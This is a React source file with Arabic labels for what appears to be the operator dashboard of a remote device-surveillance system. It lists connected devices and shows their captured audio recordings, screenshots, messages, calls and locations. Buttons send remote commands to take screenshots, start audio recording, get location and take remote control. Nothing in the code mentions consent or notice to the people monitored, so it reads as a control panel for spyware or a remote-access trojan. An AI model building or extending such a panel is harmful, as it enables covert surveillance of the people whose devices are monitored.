import React, { useState, useEffect, useRef } from 'react';
import './App.css';

const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

function WorldClassDashboard() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [devices, setDevices] = useState([]);
  const [audioRecordings, setAudioRecordings] = useState([]);
  const [screenshots, setScreenshots] = useState([]);
  const [activities, setActivities] = useState([]);
  const [messages, setMessages] = useState([]);
  const [calls, setCalls] = useState([]);
  const [statistics, setStatistics] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [realTimeData, setRealTimeData] = useState({});
  const [notifications, setNotifications] = useState([]);
  const [darkMode, setDarkMode] = useState(true);
  const wsRef = useRef(null);

  useEffect(() => {
    fetchInitialData();
    setupWebSocket();
    setupNotifications();
    
    return () => {
      if (wsRef.current) {
        wsRef.current.close();
      }
    };
  }, []);

  const setupWebSocket = () => {
    const wsUrl = API_BASE_URL.replace('http', 'ws') + '/ws';
    wsRef.current = new WebSocket(wsUrl);
    
    wsRef.current.onmessage = (event) => {
      const data = JSON.parse(event.data);
      handleRealTimeUpdate(data);
    };
    
    wsRef.current.onclose = () => {
      setTimeout(setupWebSocket, 5000);
    };
  };

  const handleRealTimeUpdate = (data) => {
    switch (data.type) {
      case 'device_status':
        updateDeviceStatus(data.device_id, data.status);
        break;
      case 'new_recording':
        setAudioRecordings(prev => [data.recording, ...prev]);
        addNotification('تسجيل صوتي جديد', 'success');
        break;
      case 'new_screenshot':
        setScreenshots(prev => [data.screenshot, ...prev]);
        addNotification('لقطة شاشة جديدة', 'info');
        break;
      case 'security_alert':
        addNotification(data.message, 'warning');
        break;
      default:
        break;
    }
  };

  const fetchInitialData = async () => {
    setLoading(true);
    setError('');
    
    try {
      const endpoints = [
        '/api/devices',
        '/api/audio',
        '/api/screenshots',
        '/api/activities',
        '/api/messages',
        '/api/calls',
        '/api/statistics'
      ];
      
      const responses = await Promise.all(
        endpoints.map(endpoint => fetch(`${API_BASE_URL}${endpoint}`))
      );
      
      const data = await Promise.all(
        responses.map(response => response.json())
      );
      
      setDevices(data[0].devices || []);
      setAudioRecordings(data[1].recordings || []);
      setScreenshots(data[2].screenshots || []);
      setActivities(data[3].activities || []);
      setMessages(data[4].messages || []);
      setCalls(data[5].calls || []);
      setStatistics(data[6] || {});
      
    } catch (error) {
      setError('فشل في تحميل البيانات: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const addNotification = (message, type = 'info') => {
    const notification = {
      id: Date.now(),
      message,
      type,
      timestamp: new Date()
    };
    
    setNotifications(prev => [notification, ...prev.slice(0, 9)]);
    
    setTimeout(() => {
      setNotifications(prev => prev.filter(n => n.id !== notification.id));
    }, 5000);
  };

  const sendAdvancedCommand = async (deviceId, command, params = {}) => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/devices/${deviceId}/command`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ command, params })
      });
      
      const result = await response.json();
      
      if (result.success) {
        addNotification(`تم إرسال الأمر: ${command}`, 'success');
      } else {
        addNotification(`فشل في إرسال الأمر: ${result.error}`, 'error');
      }
      
      return result;
    } catch (error) {
      addNotification('خطأ في الاتصال', 'error');
      return { success: false, error: error.message };
    }
  };

  const renderAdvancedDashboard = () => (
    <div className={`dashboard-container ${darkMode ? 'dark' : 'light'}`}>
      <div className="dashboard-header">
        <h1 className="dashboard-title">
          🌟 نظام المراقبة العالمي المتقدم
          <span className="subtitle">World-Class Monitoring System</span>
        </h1>
        
        <div className="header-controls">
          <button 
            onClick={() => setDarkMode(!darkMode)}
            className="theme-toggle"
          >
            {darkMode ? '☀️' : '🌙'}
          </button>
          
          <div className="real-time-indicator">
            <span className="status-dot active"></span>
            مباشر
          </div>
        </div>
      </div>

      <div className="stats-grid">
        <div className="stat-card devices">
          <div className="stat-icon">📱</div>
          <div className="stat-content">
            <h3>{devices.length}</h3>
            <p>الأجهزة المتصلة</p>
          </div>
        </div>
        
        <div className="stat-card recordings">
          <div className="stat-icon">🎵</div>
          <div className="stat-content">
            <h3>{audioRecordings.length}</h3>
            <p>التسجيلات الصوتية</p>
          </div>
        </div>
        
        <div className="stat-card screenshots">
          <div className="stat-icon">📸</div>
          <div className="stat-content">
            <h3>{screenshots.length}</h3>
            <p>لقطات الشاشة</p>
          </div>
        </div>
        
        <div className="stat-card activities">
          <div className="stat-icon">⚡</div>
          <div className="stat-content">
            <h3>{activities.length}</h3>
            <p>الأنشطة</p>
          </div>
        </div>
      </div>

      <div className="dashboard-content">
        <div className="main-panel">
          <div className="devices-overview">
            <h2>🔍 نظرة عامة على الأجهزة</h2>
            <div className="devices-grid">
              {devices.map(device => (
                <div key={device.device_id} className="device-card">
                  <div className="device-header">
                    <span className={`status-indicator ${device.status}`}></span>
                    <h3>{device.device_name || device.device_id}</h3>
                  </div>
                  
                  <div className="device-info">
                    <p>📍 الموقع: {device.location || 'غير محدد'}</p>
                    <p>🔋 البطارية: {device.battery_level || 'غير معروف'}%</p>
                    <p>⏰ آخر اتصال: {device.last_seen || 'لم يتصل'}</p>
                  </div>
                  
                  <div className="device-actions">
                    <button 
                      onClick={() => sendAdvancedCommand(device.device_id, 'take_screenshot')}
                      className="action-btn screenshot"
                    >
                      📸 لقطة شاشة
                    </button>
                    
                    <button 
                      onClick={() => sendAdvancedCommand(device.device_id, 'start_recording')}
                      className="action-btn record"
                    >
                      🎵 تسجيل صوتي
                    </button>
                    
                    <button 
                      onClick={() => sendAdvancedCommand(device.device_id, 'get_location')}
                      className="action-btn location"
                    >
                      📍 الموقع
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
        
        <div className="side-panel">
          <div className="notifications-panel">
            <h3>🔔 الإشعارات المباشرة</h3>
            <div className="notifications-list">
              {notifications.map(notification => (
                <div key={notification.id} className={`notification ${notification.type}`}>
                  <span className="notification-message">{notification.message}</span>
                  <span className="notification-time">
                    {notification.timestamp.toLocaleTimeString('ar-SA')}
                  </span>
                </div>
              ))}
            </div>
          </div>
          
          <div className="quick-actions">
            <h3>⚡ إجراءات سريعة</h3>
            <button 
              onClick={() => fetchInitialData()}
              className="quick-action refresh"
            >
              🔄 تحديث البيانات
            </button>
            
            <button 
              onClick={() => sendAdvancedCommand('all', 'health_check')}
              className="quick-action health"
            >
              💚 فحص الحالة
            </button>
            
            <button 
              onClick={() => sendAdvancedCommand('all', 'sync_data')}
              className="quick-action sync"
            >
              🔄 مزامنة البيانات
            </button>
          </div>
        </div>
      </div>
    </div>
  );

  const renderAdvancedDevices = () => (
    <div className="advanced-devices">
      <div className="devices-header">
        <h2>📱 إدارة الأجهزة المتقدمة</h2>
        <div className="devices-controls">
          <input 
            type="text" 
            placeholder="البحث في الأجهزة..."
            className="search-input"
          />
          <select className="filter-select">
            <option value="all">جميع الأجهزة</option>
            <option value="online">متصل</option>
            <option value="offline">غير متصل</option>
          </select>
        </div>
      </div>
      
      <div className="devices-table">
        <table>
          <thead>
            <tr>
              <th>الحالة</th>
              <th>اسم الجهاز</th>
              <th>الموقع</th>
              <th>البطارية</th>
              <th>آخر اتصال</th>
              <th>الإجراءات</th>
            </tr>
          </thead>
          <tbody>
            {devices.map(device => (
              <tr key={device.device_id}>
                <td>
                  <span className={`status-badge ${device.status}`}>
                    {device.status === 'online' ? 'متصل' : 'غير متصل'}
                  </span>
                </td>
                <td>{device.device_name || device.device_id}</td>
                <td>{device.location || 'غير محدد'}</td>
                <td>
                  <div className="battery-indicator">
                    <span className="battery-level">{device.battery_level || 0}%</span>
                  </div>
                </td>
                <td>{device.last_seen || 'لم يتصل'}</td>
                <td>
                  <div className="action-buttons">
                    <button 
                      onClick={() => setSelectedDevice(device)}
                      className="btn-primary"
                    >
                      تفاصيل
                    </button>
                    <button 
                      onClick={() => sendAdvancedCommand(device.device_id, 'remote_control')}
                      className="btn-secondary"
                    >
                      تحكم عن بعد
                    </button>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );

  const renderTabContent = () => {
    switch (activeTab) {
      case 'dashboard':
        return renderAdvancedDashboard();
      case 'devices':
        return renderAdvancedDevices();
      case 'files':
        return renderAdvancedFiles();
      case 'monitoring':
        return renderAdvancedMonitoring();
      case 'reports':
        return renderAdvancedReports();
      default:
        return renderAdvancedDashboard();
    }
  };

  const renderAdvancedFiles = () => (
    <div className="advanced-files">
      <h2>📁 إدارة الملفات المتقدمة</h2>
      <div className="files-grid">
        <div className="file-category">
          <h3>🎵 التسجيلات الصوتية ({audioRecordings.length})</h3>
          <div className="files-list">
            {audioRecordings.slice(0, 10).map(recording => (
              <div key={recording.id} className="file-item">
                <div className="file-info">
                  <span className="file-name">{recording.filename}</span>
                  <span className="file-size">{recording.size}</span>
                </div>
                <div className="file-actions">
                  <button className="btn-play">▶️</button>
                  <button className="btn-download">⬇️</button>
                </div>
              </div>
            ))}
          </div>
        </div>
        
        <div className="file-category">
          <h3>📸 لقطات الشاشة ({screenshots.length})</h3>
          <div className="screenshots-grid">
            {screenshots.slice(0, 12).map(screenshot => (
              <div key={screenshot.id} className="screenshot-item">
                <img 
                  src={`${API_BASE_URL}/uploads/screenshots/${screenshot.filename}`}
                  alt="Screenshot"
                  className="screenshot-thumbnail"
                />
                <div className="screenshot-overlay">
                  <button className="btn-view">👁️</button>
                  <button className="btn-download">⬇️</button>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );

  const renderAdvancedMonitoring = () => (
    <div className="advanced-monitoring">
      <h2>🔍 المراقبة المتقدمة</h2>
      <div className="monitoring-panels">
        <div className="activities-panel">
          <h3>⚡ الأنشطة الحديثة</h3>
          <div className="activities-list">
            {activities.map(activity => (
              <div key={activity.id} className="activity-item">
                <span className="activity-icon">📱</span>
                <div className="activity-content">
                  <p className="activity-description">{activity.description}</p>
                  <span className="activity-time">{activity.timestamp}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
        
        <div className="messages-panel">
          <h3>💬 الرسائل</h3>
          <div className="messages-list">
            {messages.map(message => (
              <div key={message.id} className="message-item">
                <div className="message-header">
                  <span className="sender">{message.sender}</span>
                  <span className="time">{message.timestamp}</span>
                </div>
                <p className="message-content">{message.content}</p>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );

  const renderAdvancedReports = () => (
    <div className="advanced-reports">
      <h2>📊 التقارير المتقدمة</h2>
      <div className="reports-grid">
        <div className="report-card">
          <h3>📈 تقرير الاستخدام اليومي</h3>
          <div className="chart-placeholder">
            <p>رسم بياني للاستخدام اليومي</p>
          </div>
        </div>
        
        <div className="report-card">
          <h3>🌍 تقرير المواقع</h3>
          <div className="map-placeholder">
            <p>خريطة المواقع</p>
          </div>
        </div>
        
        <div className="report-card">
          <h3>🔋 تقرير البطارية</h3>
          <div className="battery-chart">
            <p>رسم بياني لمستوى البطارية</p>
          </div>
        </div>
      </div>
    </div>
  );

  if (loading) {
    return (
      <div className="loading-screen">
        <div className="loading-spinner"></div>
        <p>جاري تحميل النظام المتقدم...</p>
      </div>
    );
  }

  return (
    <div className={`world-class-app ${darkMode ? 'dark-theme' : 'light-theme'}`}>
      <nav className="advanced-nav">
        <div className="nav-brand">
          <h1>🌟 نظام المراقبة العالمي</h1>
        </div>
        
        <div className="nav-tabs">
          {[
            { id: 'dashboard', label: '🏠 لوحة التحكم', icon: '🏠' },
            { id: 'devices', label: '📱 الأجهزة', icon: '📱' },
            { id: 'files', label: '📁 الملفات', icon: '📁' },
            { id: 'monitoring', label: '🔍 المراقبة', icon: '🔍' },
            { id: 'reports', label: '📊 التقارير', icon: '📊' }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`nav-tab ${activeTab === tab.id ? 'active' : ''}`}
            >
              <span className="tab-icon">{tab.icon}</span>
              <span className="tab-label">{tab.label}</span>
            </button>
          ))}
        </div>
      </nav>

      <main className="app-content">
        {error && (
          <div className="error-banner">
            <span>❌ {error}</span>
            <button onClick={() => setError('')}>✕</button>
          </div>
        )}
        
        {renderTabContent()}
      </main>

      {selectedDevice && (
        <div className="device-modal">
          <div className="modal-content">
            <div className="modal-header">
              <h3>تفاصيل الجهاز: {selectedDevice.device_name}</h3>
              <button onClick={() => setSelectedDevice(null)}>✕</button>
            </div>
            <div className="modal-body">
              <p>معرف الجهاز: {selectedDevice.device_id}</p>
              <p>الحالة: {selectedDevice.status}</p>
              <p>الموقع: {selectedDevice.location}</p>
              <p>مستوى البطارية: {selectedDevice.battery_level}%</p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default WorldClassDashboard;
